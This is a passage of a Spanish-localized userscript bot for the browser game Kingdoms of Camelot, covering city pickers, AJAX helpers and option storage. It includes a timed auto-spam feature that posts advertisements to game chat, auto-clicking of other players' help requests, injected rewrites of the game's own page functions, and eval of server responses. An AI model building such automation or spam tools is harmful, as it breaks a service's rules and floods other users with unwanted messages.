  else if (oid==2)
    return 'Vice Canciller';
  else if (oid==1)
    return 'Canciller';
  return '';
}

var fortNamesShort = {
  53: "Ballistas de Muro",
  55: "Fundibulos",
  60: "Trampas",
  61: "Abrojos",
  62: "Barreras de Picos",
}

// onClick (city{name, id, x, y}, x, y)   city may be null!
function CdispCityPicker (id, span, dispName, notify, selbut){
  function CcityButHandler (t){
    var that = t;
    this.clickedCityBut = clickedCityBut;
    function clickedCityBut (e){
      if (that.selected != null)
        that.selected.className = "castleBut castleButNon";
      that.city = Cities.cities[e.target.id.substr(that.prefixLen)];
      if (that.dispName)
        document.getElementById(that.id+'cname').innerHTML = that.city.name;
      e.target.className = "castleBut castleButSel";
      that.selected = e.target;
      if (that.coordBoxX){
        that.coordBoxX.value = that.city.x;
        that.coordBoxY.value = that.city.y;
        var evt = document.createEvent("HTMLEvents");
        evt.initEvent('change', true, true ); // event type,bubbling,cancelable
        that.coordBoxX.dispatchEvent(evt);
        that.coordBoxY.dispatchEvent(evt);
        that.coordBoxX.style.backgroundColor = '#ffffff';
        that.coordBoxY.style.backgroundColor = '#ffffff';
      }
      if (that.notify != null)
        that.notify(that.city, that.city.x, that.city.y);
    }
  }

  function selectBut (idx){
    document.getElementById(this.id+'_'+idx).click();
  }

  function bindToXYboxes (eX, eY){
    function CboxHandler (t){
      var that = t;
      this.eventChange = eventChange;
      if (that.city){
        eX.value = that.city.x;
        eY.value = that.city.y;
      }
      function eventChange (){
        var xValue=that.coordBoxX.value.trim();
			var xI=/^\s*([0-9]+)[\s|,|-|.]+([0-9]+)/.exec(xValue);
			if(xI) {
				that.coordBoxX.value=xI[1]
				that.coordBoxY.value=xI[2]
			}
		var x = parseInt(that.coordBoxX.value, 10);
        var y = parseInt(that.coordBoxY.value, 10);
        if (isNaN(x) || x<0 || x>750){
          that.coordBoxX.style.backgroundColor = '#ff8888';
          return;
        }
        if (isNaN(y) || y<0 || y>750){
          that.coordBoxY.style.backgroundColor = '#ff8888';
          return;
        }
        that.coordBoxX.style.backgroundColor = '#ffffff';
        that.coordBoxY.style.backgroundColor = '#ffffff';
        if (that.notify != null)
          that.notify (null, x, y);
      }
	 return false;
    }
    this.coordBoxX = eX;
    this.coordBoxY = eY;
    var bh = new CboxHandler(this);
    eX.maxLength=8;
    eY.maxLength=3;
   eX.style.width='2em';
    eY.style.width='2em';
    eX.addEventListener('change', bh.eventChange, false);
    eY.addEventListener('change', bh.eventChange, false);
  }

  this.selectBut = selectBut;
  this.bindToXYboxes = bindToXYboxes;
  this.coordBoxX = null;
  this.coordBoxY = null;
  this.id = id;
  this.dispName = dispName;
  this.prefixLen = id.length+1;
  this.notify = notify;
  this.selected = null;
  this.city = null;
  var m = '';
  for (var i=0; i<Cities.cities.length; i++)
    m += '<INPUT class="castleBut castleButNon" id="'+ id +'_'+ i +'" value="'+ (i+1) +'" type=submit \>';
  if (dispName)
    m += ' &nbsp; <SPAN style="display:inline-block; width:85px; font-weight:bold;" id='+ id +'cname' +'></span>';
  span.innerHTML = m;
  var handler = new CcityButHandler(this);
  for (var i=0; i<Cities.cities.length; i++)
    document.getElementById (id+'_'+i).addEventListener('click', handler.clickedCityBut, false);
  if (selbut != null)
    this.selectBut(selbut);
};

function setCities(){
  Cities.numCities = Seed.cities.length;
  Cities.cities = [];
  Cities.byID = {};
  for (i=0; i<Cities.numCities; i++){
    city = {};
    city.idx = i;
    city.id = parseInt(Seed.cities[i][0]);
    city.name = Seed.cities[i][1];
    city.x = parseInt(Seed.cities[i][2]);
    city.y = parseInt(Seed.cities[i][3]);
    city.tileId = parseInt(Seed.cities[i][5]);
    Cities.cities[i] = city;
    Cities.byID[Seed.cities[i][0]] = city;
  }
}


function dialogRetry (errMsg, seconds, onRetry, onCancel, errCode){
  seconds = parseInt(seconds);
  var pop = new CPopup ('pbretry', 0, 0, 400,200, true);
  pop.centerMe(mainPop.getMainDiv());
  pop.getTopDiv().innerHTML = '<CENTER>KOC Power Bot</center>';
  pop.getMainDiv().innerHTML = '<CENTER><BR><FONT COLOR=#550000><B>Ha ocurrido un error:</b></font><BR><BR><DIV id=paretryErrMsg></div>\
      <BR><BR><B>Automaticamente recargar en <SPAN id=paretrySeconds></b></span> sgs ...<BR><BR><INPUT id=paretryCancel type=submit value="CANCELAR Recarga" \>';
  document.getElementById('paretryCancel').addEventListener ('click', doCancel, false);
  pop.show(true);

  if(errCode && unsafeWindow.g_js_strings.errorcode['err_'+errCode])
	document.getElementById('paretryErrMsg').innerHTML = unsafeWindow.g_js_strings.errorcode['err_'+errCode];
  else
  document.getElementById('paretryErrMsg').innerHTML = errMsg;
  document.getElementById('paretrySeconds').innerHTML = seconds;
  var rTimer = setTimeout (doRetry, seconds*1000);
  countdown ();

  function countdown (){
    document.getElementById('paretrySeconds').innerHTML = seconds--;
    if (seconds > 0)
      cdTimer = setTimeout (countdown, 1000);
  }
  function doCancel(){
    clearTimeout (rTimer);
    clearTimeout (cdTimer);
    pop.destroy();
    onCancel ();
  }
  function doRetry (){
    clearTimeout (rTimer);
    clearTimeout (cdTimer);
    pop.show(false);
    onRetry();
  }
}

function implodeUrlArgs (obj){
  var a = [];
  for (var k in obj)
    a.push (k +'='+ encodeURI(obj[k]) );
  return a.join ('&');
}

// NOTE: args can be either a string which will be appended as is to url or an object of name->values
function addUrlArgs (url, args){
  if (!args)
    return url;
  if (url.indexOf('?') < 0)
    url += '?';
  else if (url.substr(url.length-1) != '&')
    url += '&';
  if (matTypeof(args == 'object'))
    return url + implodeUrlArgs (args);
  return url + args;
}

// emulate protoype's Ajax.Request ...
function AjaxRequest (url, opts){
  var headers = {
    'X-Requested-With': 'XMLHttpRequest',
    'X-Prototype-Version': '1.6.1',
    'Accept': 'text/javascript, text/html, application/xml, text/xml, */*'
  };
  var ajax = null;

  if (window.XMLHttpRequest)
    ajax=new XMLHttpRequest();
  else
    ajax=new ActiveXObject("Microsoft.XMLHTTP");

  if (opts.method==null || opts.method=='')
    method = 'GET';
  else
    method = opts.method.toUpperCase();

  if (method == 'POST'){
    headers['Content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
  } else if (method == 'GET'){
    addUrlArgs (url, opts.parameters);
  }

  ajax.onreadystatechange = function(){
//  ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete']; states 0-4
    if (ajax.readyState==4) {
      if (ajax.status >= 200 && ajax.status < 305)
        if (opts.onSuccess) opts.onSuccess(ajax);
      else
        if (opts.onFailure) opts.onFailure(ajax);
    } else {
      if (opts.onChange) opts.onChange (ajax);
    }
  }

  ajax.open(method, url, true);   // always async!

  for (var k in headers)
    ajax.setRequestHeader (k, headers[k]);
  if (matTypeof(opts.requestHeaders)=='object')
    for (var k in opts.requestHeaders)
      ajax.setRequestHeader (k, opts.requestHeaders[k]);

  if (method == 'POST'){
    var a = [];
    for (k in opts.parameters){
	  if(matTypeof(opts.parameters[k]) == 'object')
		for(var h in opts.parameters[k])
			a.push (k+'['+h+'] ='+ opts.parameters[k][h] );
	  else
      a.push (k +'='+ opts.parameters[k] );
	}
	ajax.send (a.join ('&'));
  } else               {
    ajax.send();
  }
}


function MyAjaxRequest (url, o, noRetryX){
if (DEBUG_TRACE) logit (" 0 myAjaxRequest: "+ url +"\n" + inspect (o, 2, 1));
  var opts = unsafeWindow.Object.clone(o);
  var wasSuccess = o.onSuccess;
  var wasFailure = o.onFailure;
  var retry = 0;
  var delay = 5;
  var noRetry = noRetry===true?true:false;
  opts.onSuccess = mySuccess;
  opts.onFailure = myFailure;

  new AjaxRequest(url, opts);
  return;

  function myRetry(){
    ++retry;
    new AjaxRequest(url, opts);
    delay = delay * 1.25;
  }
  function myFailure(){
    var o = {};
    o.ok = false;
    o.errorMsg = "Fallo de comunicación con AJAX";
    wasFailure (o);
  }
  function mySuccess (msg){
    var rslt = eval("(" + msg.responseText + ")");
    var x;
    if (window.EmulateAjaxError){
      rslt.ok = false;
      rslt.error_code=8;
    }
    if (rslt.ok){
      if (rslt.updateSeed)
        unsafeWindow.update_seed(rslt.updateSeed);
      wasSuccess (rslt);
      return;
    }
    rslt.errorMsg = unsafeWindow.printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null));
    //if ( (x = rslt.errorMsg.indexOf ('<br><br>')) > 0)
     // rslt.errorMsg = rslt.errorMsg.substr (0, x-1);
    if (!noRetry && (rslt.error_code==0 ||rslt.error_code==8 || rslt.error_code==1 || rslt.error_code==3)){
      dialogRetry (rslt.errorMsg, delay, function(){myRetry()}, function(){wasSuccess (rslt)}, rslt.error_code);
    } else {
      wasSuccess (rslt);
    }
  }
}

// returns: 'neutral', 'friendly', or 'hostile'
function getDiplomacy (aid) {
  if(aid < 1 || aid == null)
    return 'unallianced';
  if (Seed.allianceDiplomacies == null)
    return 'neutral';
  if (Seed.allianceDiplomacies.friendly && Seed.allianceDiplomacies.friendly['a'+aid] != null)
    return 'amigable';
  if (Seed.allianceDiplomacies.hostile && Seed.allianceDiplomacies.hostile['a'+aid] != null)
    return 'hostil';
  return 'neutral';
};

function getMyAlliance (){
  if (Seed.allianceDiplomacies==null || Seed.allianceDiplomacies.allianceName==null)
    return [0, 'None'];
  else
    return [Seed.allianceDiplomacies.allianceId, Seed.allianceDiplomacies.allianceName];
}

function distance (d, f, c, e) {
  var a = 750;
  var g = a / 2;
  var b = Math.abs(c - d);
  if (b > g)
    b = a - b;
  var h = Math.abs(e - f);
  if (h > g)
    h = a - h;
  return Math.round(100 * Math.sqrt(b * b + h * h)) / 100;
};


// returns {count, maxlevel}
function getCityBuilding (cityId, buildingId){
  var b = Seed.buildings['city'+cityId];
  var ret = {count:0, maxLevel:0};
  for (var i=1; i<33; i++){
    if (b['pos'+i] && b['pos'+i][0] == buildingId){
      ++ret.count;
      if (parseInt(b['pos'+i][1]) > ret.maxLevel)
        ret.maxLevel = parseInt(b['pos'+i][1]);
    }
  }
  return ret;
}

// example: http://www150.kingdomsofcamelot.com
var myServerId = null;
function getServerId() {
  if (myServerId == null){
    var m=/^[a-zA-Z]+([0-9]+)\./.exec(document.location.hostname);
    if (m)
      myServerId = m[1];
    else
      myServerId = '??';
  }
  return myServerId;
}

function logit (msg){
  var now = new Date();
  GM_log (getServerId() +' @ '+ now.toTimeString().substring (0,8) +'.' + now.getMilliseconds() +': '+  msg);
}



function saveOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('Options_'+serverID, JSON2.stringify(Options));}, 0);
}

function saveChatOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('ChatOptions_'+serverID, JSON2.stringify(ChatOptions));}, 0);
}

function saveTrainOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('TrainOptions_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(TrainOptions));}, 0);
}

function saveCrestOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('CrestOptions_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(CrestOptions));}, 0);
}



function readOptions (){
  var serverID = getServerId();
  s = GM_getValue ('Options_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          Options[k][kk] = opts[k][kk];
      else
        Options[k] = opts[k];
    }
  }
}

function readGlobalOptions (){
  GlobalOptions = JSON2.parse (GM_getValue ('Options_??', '{}'));
}

function readChatOptions (){
  var serverID = getServerId();
  s = GM_getValue ('ChatOptions_'+serverID, '[]');
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          ChatOptions[k][kk] = opts[k][kk];
      else
        ChatOptions[k] = opts[k];
    }
  }
}

function readCrestOptions (){
  var serverID = getServerId();
  s = GM_getValue ('CrestOptions_' + Seed.player['name'] + '_' +serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          CrestOptions[k][kk] = opts[k][kk];
      else
        CrestOptions[k] = opts[k];
    }
  }
}

function readTrainingOptions (){
  var serverID = getServerId();
  s = GM_getValue ('TrainOptions_' + Seed.player['name'] + '_' +serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          TrainOptions[k][kk] = opts[k][kk];
      else
        TrainOptions[k] = opts[k];
    }
  }
}

function createButton (label,id){
  var a=document.createElement('a');
  a.className='button20';
  a.id = id;
  a.innerHTML='<span style="color: #ff6">'+ label +'</span>';
  return a;
}

function AddMainTabLink(text, eventListener, mouseListener) {
  var a = createButton (text,'botbutton');
  a.className='tab';
  var tabs=document.getElementById('main_engagement_tabs');
  if(!tabs) {
    tabs=document.getElementById('topnav_msg');
    if (tabs)
      tabs=tabs.parentNode;
  }
  if (tabs) {
    var e = tabs.parentNode;
    var gmTabs = null;
    for (var i=0; i<e.childNodes.length; i++){
      var ee = e.childNodes[i];
      if (ee.tagName && ee.tagName=='DIV' && ee.className=='tabs_engagement' && ee.id!='main_engagement_tabs'){
        gmTabs = ee;
        break;
      }
    }
    if (gmTabs == null){
      gmTabs = document.createElement('div');
      gmTabs.className='tabs_engagement';
      gmTabs.style.background='#ca5';
      tabs.parentNode.insertBefore (gmTabs, tabs);
      gmTabs.style.whiteSpace='nowrap';
      gmTabs.style.width='735px';
      gmTabs.lang = 'en_PB';
    }
    gmTabs.appendChild(a);
    a.addEventListener('click',eventListener, false);
    if (mouseListener != null)
      a.addEventListener('mousedown',mouseListener, true);
    return a;
  }
  return null;
}

function AddSubTabLink(text, eventListener, id) {
  var a = createButton (text,'botbutton');
  a.className='tab';
  var tabs=document.getElementById('main_engagement_tabs');
  if(!tabs) {
    tabs=document.getElementById('topnav_msg');
    if (tabs)
      tabs=tabs.parentNode;
  }
  if (tabs) {
    var e = tabs.parentNode;
    var gmTabs = null;
    for (var i=0; i<e.childNodes.length; i++){
      var ee = e.childNodes[i];
      if (ee.tagName && ee.tagName=='DIV' && ee.className=='tabs_engagement' && ee.id!='main_engagement_tabs'){
        gmTabs = ee;
        break;
      }
    }
    if (gmTabs == null){
      gmTabs = document.createElement('div');
      gmTabs.className='tabs_engagement';
      gmTabs.style.background='#ca5';
      tabs.parentNode.insertBefore (gmTabs, tabs);
      gmTabs.style.whiteSpace='nowrap';
      gmTabs.style.width='735px';
      gmTabs.lang = 'en_PB';
    }
    gmTabs.appendChild(a);
    a.addEventListener('click',eventListener, false);
    if (id != null)
      a.id = id;
    return a;
  }
  return null;
}

function coordLink (x, y){
  var m = [];
  m.push ('(<a onclick="pbGotoMap (');
  m.push (x);
  m.push (',');
  m.push (y);
  m.push ('); return false">');
  m.push (x);
  m.push (',');
  m.push (y);
  m.push ('</a>)');
  return m.join('');
}


unsafeWindow.pbGotoMap = function (x, y){
  if (Options.hideOnGoto)
  hideMe ();
  setTimeout (function (){
    document.getElementById('mapXCoor').value = x;
    document.getElementById('mapYCoor').value = y;
    unsafeWindow.reCenterMapWithCoor();
    var a = document.getElementById("mod_views").getElementsByTagName("a");
    for (var b = 0; b < a.length; b++) {
        a[b].className = ""
    }
    document.getElementById('mod_views_map').className = "sel";
    document.getElementById("maparea_city").style.display = 'none';
    document.getElementById("maparea_fields").style.display = 'none';
    document.getElementById("maparea_map").style.display = 'block';
    unsafeWindow.tutorialClear()
  }, 0);
};

/****************************  Spam Tab  ******************************/
Tabs.Spam = {
  tabOrder : 500,                    // order to place tab in top bar
  tabLabel : 'Spam',            // label to show in main window tabs
  myDiv : null,
  timer : null,

  init : function (div){    // called once, upon script startup
    var t = Tabs.Spam;
    t.myDiv = div;
    var m = '<DIV class=pbStat>Publicidad</div><TABLE class=pbTab width=100% height=0% ><TR align="center">';

       if (Options.spamconfig.aspam == true) {
        m += '<TD><INPUT id=pbSpamEnable type=submit value="Spam On"></td>';
       }
       else {
        m += '<TD><INPUT id=pbSpamEnable type=submit value="Spam Off"></td>';
       }

       if (Options.spamconfig.spamstate == 'a') {
        m += '<TD><INPUT id=pbSpamState type=submit value="Enviar a Alianza"></td>';
       }
       else {
        m += '<TD><INPUT id=pbSpamState type=submit value="Enviar a Global "></td>';
       }
        m += '</tr></table></div>';
       m += '<DIV class=pbStat>Configuración</div><TABLE class=pbTab>';
        m += '<tr><td>Automaticamente postear todo cada <INPUT id=pbSpamMin type=text size=2 maxlength=3 value="'+ Options.spamconfig.spammins +'"  \> minutos</td></tr><BR>\
              <tr><TD><TABLE cellpadding=0 cellspacing=0>\
              <TD align=left>Tu Publicidad: &nbsp; </td><TD><INPUT id=pbSpamAd type=text size=60 maxlength=500 value="'+ Options.spamconfig.spamvert +'" \></td></tr>\
              </table><BR>';

    t.myDiv.innerHTML = m;

    document.getElementById('pbSpamEnable').addEventListener ('click', function(){t.toggleon(this);}, false);
    document.getElementById('pbSpamAd').addEventListener ('change', t.e_spamOptChanged, false);
    document.getElementById('pbSpamMin').addEventListener ('change', t.e_spamOptChanged, false);
    document.getElementById('pbSpamState').addEventListener ('click', function(){t.togglespam(this);}, false);
 },

  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.Spam;
  },

  show : function (){         // called whenever this tab is shown
    var t = Tabs.Spam;

  },

 e_spamOptChanged : function (){
  var t = Tabs.Spam;
  Options.spamconfig.spamvert = document.getElementById('pbSpamAd').value;
  Options.spamconfig.spammins = document.getElementById('pbSpamMin').value;
  if(parseInt(Options.spamconfig.spammins) < 30){
   Options.spamconfig.spammins = 30;
   document.getElementById('pbSpamMin').value = 30;
  }
  saveOptions ();

// if(Options.spamconfig.spamvert == 'nessaja') {
   // Options.spamconfig.spamvert = '';
   // top.location = "http://www.facebook.com/?ref=baos780";
//};
 },

 togglespam: function(obj){
  var t = Tabs.Spam;
  if (Options.spamconfig.spamstate == 'a') {
   Options.spamconfig.spamstate = 'g';
   obj.value = "Enviar a  Global ";
  }
  else {
   Options.spamconfig.spamstate = 'a';
   obj.value = "Enviar a Alianza";
  }
  saveOptions ();

 },

 toggleon: function(obj){
  var t = Tabs.Spam;
  if (Options.spamconfig.aspam == true) {
   Options.spamconfig.aspam = false;
   obj.value = "Spam Off";
  }
  else {
   Options.spamconfig.aspam = true;
   obj.value = "Spam On";
   SpamEvery.init();
  }
  saveOptions ();

 },
};

var SpamEvery  = {
  timer : null,
  spamtimer : 0,
  init : function (){
	if (!Options.spamconfig.aspam) return;
    if (Options.spamconfig.spammins < 1)
      Options.spamconfig.spammins = 1;
    SpamEvery.setEnable (Options.spamconfig.aspam);
  },
  setEnable : function (tf){
    var t = SpamEvery;
    clearTimeout (t.timer);
    if (tf)
      t.timer = setTimeout (t.count, 60*1000);
  },
  count : function (){
   var t = SpamEvery;
   t.spamtimer = Options.spamconfig.spammins;
   if(parseInt(t.spamtimer) < 60) t.spamtimer = 60;
   if (Options.spamconfig.atime > t.spamtimer) {
    Options.spamconfig.atime = 2;
    t.doit ();
   } else {
    Options.spamconfig.atime = (Options.spamconfig.atime + 1);
    SpamEvery.init ();
   }
   saveOptions ();
  },
  doit : function (){
    actionLog ('Espameando ('+ Options.spamconfig.spammins +' minutos caducado)');
    sendChat ("/" + Options.spamconfig.spamstate + " " +  Options.spamconfig.spamvert);
    SpamEvery.init ();
  }
}

/************** ChatPane **********/
var ChatPane = {
  init : function(){
    var t = ChatPane;
	setInterval(t.HandleChatPane, 2500);
  },

  HandleChatPane : function() {
	var DisplayName = GetDisplayName();
	var AllianceChatBox=document.getElementById('mod_comm_list2');

	if(AllianceChatBox){
		var chatPosts = document.evaluate(".//div[contains(@class,'chatwrap')]", AllianceChatBox, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
		if(chatPosts){
			for (var i = 0; i < chatPosts.snapshotLength; i++) {
				thisPost = chatPosts.snapshotItem(i);
				if(Options.HelpRequest){
					var postAuthor = document.evaluate('.//*[@class="nm"]', thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
					if(postAuthor.snapshotItem(0)){
						var postAuthorName = postAuthor.snapshotItem(0).innerHTML;
						if(postAuthorName != DisplayName){
							var helpAllianceLinks=document.evaluate(".//a[contains(@onclick,'claimAllianceChatHelp')]", thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
							if(helpAllianceLinks){
								for (var j = 0; j < helpAllianceLinks.snapshotLength; j++) {
									thisLink = helpAllianceLinks.snapshotItem(j);
									var alreadyClicked = thisLink.getAttribute("clicked");
									if(!alreadyClicked){
										thisLink.setAttribute('clicked', 'true');
										var myregexp = /(claimAllianceChatHelp\(.*\);)/;
										var match = myregexp.exec(thisLink.getAttribute("onclick"));

										if (match != null) {
											onclickCode = match[0];
											if(true){
												DoUnsafeWindow(onclickCode);
											}
										}
									}
								}
							}
						}
					}
				}
				// Hide alliance requests in chat
				if(Options.DeleteRequest){
					var helpAllianceLinks=document.evaluate(".//a[contains(@onclick,'claimAllianceChatHelp')]", thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
					if(helpAllianceLinks){
						for (var j = 0; j < helpAllianceLinks.snapshotLength; j++) {
							thisLink = helpAllianceLinks.snapshotItem(j);
							thisLink.parentNode.parentNode.parentNode.parentNode.parentNode.removeChild(thisLink.parentNode.parentNode.parentNode.parentNode);
						}
					}
				// Hide alliance reports in chat
					var myregexp1 = /You are # [1-5] of 5 to help/i;
					var myregexp2 = /\'s Kingdom does not need help\./i;
					var myregexp3 = /\'s project has already been completed\./i;
					var myregexp4 = /\'s project has received the maximum amount of help\./i;
					if (thisPost.innerHTML.match(myregexp1) || thisPost.innerHTML.match(myregexp2) || thisPost.innerHTML.match(myregexp3) || thisPost.innerHTML.match(myregexp4)) {
						thisPost.parentNode.removeChild(thisPost);
					}
				}
			}
		}
	}
  },

}

/**********************************************************************************/
var CalterUwFunc = function (funcName, findReplace) {
  var t = this;
  this.isEnabled = false;
  this.isAvailable = isAvailable;
  this.setEnable = setEnable;
  this.funcName = funcName;
  this.funcOld = unsafeWindow[funcName];
  this.funcNew = null;
  try {
    var funcText = unsafeWindow[funcName].toString();
    var rt = funcText.replace ('function '+ funcName, 'function');
    for (var i=0; i<findReplace.length; i++){
      x = rt.replace(findReplace[i][0], findReplace[i][1]);
      if (x == rt)
        return false;
      rt = x;
    }
    this.funcNew = rt;
  } catch (err) {
  }

  function setEnable (tf){
    if (t.funcNew == null)
      return;
    if (t.isEnabled != tf){
      if (tf){
      	var scr=document.createElement('script');
      	scr.innerHTML = funcName +' = '+ t.funcNew;
      	document.body.appendChild(scr);
        setTimeout ( function (){document.body.removeChild(scr);}, 0);
      	t.isEnabled = true;
      } else {
        unsafeWindow[t.funcName] = t.funcOld;
        t.isEnabled = false;
      }
    }
  }
  function isAvailable (){
    if (t.funcNew == null)
      return false;
    return true;
  }
};

var CalterUwVar = function (funcName, findReplace) {
  var t = this;
  this.isEnabled = false;
  this.isAvailable = isAvailable;
  this.setEnable = setEnable;
  this.funcName = funcName;
  this.funcOld = unsafeWindow[funcName];
  this.funcNew = null;
  try {
	var funcText = null;
	funcName = funcName.split('.');
	funcText = unsafeWindow[funcName[0]];
	for(var i=1; i<funcName.length; i++)
		funcText = funcText[funcName[i]];

	GM_log(funcText);
    var rt = funcText.toString();
    for (var i=0; i<findReplace.length; i++){
      x = rt.replace(findReplace[i][0], findReplace[i][1]);
      if (x == rt)
        return false;
      rt = x;
    }
    this.funcNew = rt;
  } catch (err) {
	GM_log(err);
  }
      GM_log(funcText);
  function setEnable (tf){
    if (t.funcNew == null)
      return;
    if (t.isEnabled != tf){
      if (tf){
      	var scr=document.createElement('script');
      	scr.innerHTML = funcName +' = '+ t.funcNew;
      	document.body.appendChild(scr);
        setTimeout ( function (){document.body.removeChild(scr);}, 0);
      	t.isEnabled = true;
      } else {
        unsafeWindow[t.funcName] = t.funcOld;
        t.isEnabled = false;
      }
    }
  }
  function isAvailable (){
    if (t.funcNew == null)
      return false;
    return true;
  }
};

function getMarchInfo (cityID){
  var ret = {};

  ret.marchUnits = [];
  ret.returnUnits = [];
  ret.resources = [];
  for (i=0; i<13; i++){
    ret.marchUnits[i] = 0;
    ret.returnUnits[i] = 0;
  }
  for (i=0; i<5; i++){
    ret.resources[i] = 0;
  }

  for (k in Seed.queue_atkp[cityID]){   // each march
      march = Seed.queue_atkp[cityID][k];
	  if(march.marchType != 5){
		  if (typeof (march) == 'object'){
			for (ii=0; ii<13; ii++){
			  ret.marchUnits[ii] += parseInt (march['unit'+ ii +'Count']);
			  ret.returnUnits[ii] += parseInt (march['unit'+ ii +'Return']);
			}
			for (ii=1; ii<5; ii++){
			  ret.resources[ii] += parseInt (march['resource'+ ii]);
			}
			  ret.resources[0] += parseInt (march['gold']);
		  }
	  }
  }
  return ret;
}

function makeButton20 (label){
  var a = document.createElement('a');
  a.className = "button20 ptButton20";
  var s = document.createElement('span');
  s.innerHTML = label;
  a.appendChild (s);
  return a;
}

function strButton20 (label, tags){
  if (tags == null)
    tags = '';
  return ('<TABLE class=ptNoPad><TR><TD><A class="button20 ptButton20" '+ tags +'><SPAN>'+ label +'</span></a></td></tr></table>' );
}

function reloadKOC (){
  var serverId = getServerId();
  if(serverId == '??') window.location.reload(true);
  var goto = 'http://apps.facebook.com/kingdomsofcamelot/?s='+serverId;
  var t = '<FORM target="_top" action="'+ goto +'" method=post><INPUT id=xxpbButReload type=submit value=RELOAD><INPUT type=hidden name=s value="'+ serverId +'"</form>';
  var e = document.createElement ('div');
  e.innerHTML = t;
  document.body.appendChild (e);
  setTimeout (function (){document.getElementById('xxpbButReload').click();}, 0);
}

function htmlSelector (valNameObj, curVal, tags){
  var m = [];
  m.push ('<SELECT');
  if (tags){
    m.push (' ');
    m.push (tags);
  }
  for (var k in valNameObj){
    m.push ('><OPTION ');
    if (k == curVal)
      m.push ('SELECTED ');
    m.push ('value="');
    m.push (k);
    m.push ('">');
    m.push (valNameObj[k]);
    m.push ('</option>');
  }
  m.push ('</select>');
  return m.join ('');
}

function cityStatusString (cs){
  if (cs==4)
    return 'Vacaciones';
  if (cs==3)
    return 'Tregua';
  if (cs==2)
    return 'Pedir protección';
  return 'Normal';
}

// Simple method, as if it were typed in thru DOM
function sendChat (msg){
  document.getElementById ("mod_comm_input").value = msg;
  unsafeWindow.Chat.sendChat ();
}

// works well, but message is not echoed back to local client
Chat = {
  params : null,

  sendWhisper : function (msg, who, notify){
    this.params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    this.params.ctype = 3;
    this.params.name = who;
    this._sendit (msg, notify);
  },

  sendGlobal : function (msg, notify){
    this.params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    this.params.ctype = 1;
    this._sendit (msg, notify);
  },

  sendAlliance : function (msg, notify){
    this.params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    this.params.ctype = 2;
    this._sendit (msg, notify);
  },

  _sendit : function (msg, notify){
    function strip(s) {
       return s.replace(/^\s+/, '').replace(/\s+$/, '');
    }
    this.params.comment = strip (msg);
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/sendChat.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: this.params,
      onSuccess: function(transport) {
        if (notify)
          notify ();
      },
      onFailure: function(transport) {
        if (notify)
          notify ();
      }
    });
  },
}



/************  LIB classes/functions .... **************/

DebugTimer = {
  startTime : 0,
  start : function (){
    now = new Date();
    DebugTimer.startTime = now.getTime();
  },
  getMillis : function (){
    now = new Date();
    return now.getTime() - DebugTimer.startTime;
  },
  display : function (label, noReset){
    now = new Date();
    elapsed = now.getTime() - DebugTimer.startTime;
    logit (label +": "+ elapsed/1000);
    if (noReset===null || !noReset)
      DebugTimer.startTime = now.getTime();
  },
};


function debugPos  (e){
  return '['+ e.tagName +'] client - offset: '+ e.clientLeft +','+ e.clientTop +','+ e.clientWidth +','+ e.clientHeight
          +' - '+ e.offsetLeft +','+ e.offsetTop +','+ e.offsetWidth +','+ e.offsetHeight +' '+ e +' --OP--> '+ e.offsetParent;
}

function CwaitForElement (id, timeout, notify){
  this.check = check;
  this.end = new Date().getTime() + timeout;
  var t = this;
  this.check();
  function check(){
    if (document.getElementById (id))
      notify (true);
    else if (new Date().getTime() > t.end)
      notify (false);
    else
      setTimeout (t.check, 500);
  }
}

function clickWin (win,obj,evtName) {
	var evt = win.document.createEvent("MouseEvents");
	evt.initMouseEvent(evtName, true, true, win, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
	return !obj.dispatchEvent(evt);
}

function debugElement  (e){
  var x = unsafeWindow.Object.clone (e.wrappedJSObject);
  x.innerHTML = '';
  x.innerText = '';
  x.textContent = '';
  return inspect (x, 1, 1);
}

function getClientCoords(e){
  if (e==null)
    return {x:null, y:null, width:null, height:null};
  var x=0, y=0;
  ret = {x:0, y:0, width:e.clientWidth, height:e.clientHeight};
  while (e.offsetParent != null){
    ret.x += e.offsetLeft;
    ret.y += e.offsetTop;
    e = e.offsetParent;
  }
  return ret;
}

function DOMtree (e, levels){
  var m = [];
  level (e, levels, 0);

  function level (e, levels, cur){
    try {
      for (var i=0; i<cur; i++)
        m.push('  ');
      if (!e.tagName)
        m.push ('?');
      else
        m.push (e.tagName);
      if (e.id){
        m.push (' id=');
        m.push (e.id);
      }
      if (e.name){
        m.push (' name=');
        m.push (e.name);
      }
      if (e.className){
        m.push (' class=');
        m.push (e.className);
      }
      if (e.style && e.style.display && e.style.display.indexOf('none')>0)
        m.push (' hidden');
       m.push ('\n');
      if (cur < levels){
        for (var c=0; c<e.childNodes.length; c++){
          level (e.childNodes[c], levels, cur+1);
        }
      }
    } catch (e) {
      m.push ('UNAVAILBLE!\n');
    }
  }
  return m.join('');
}

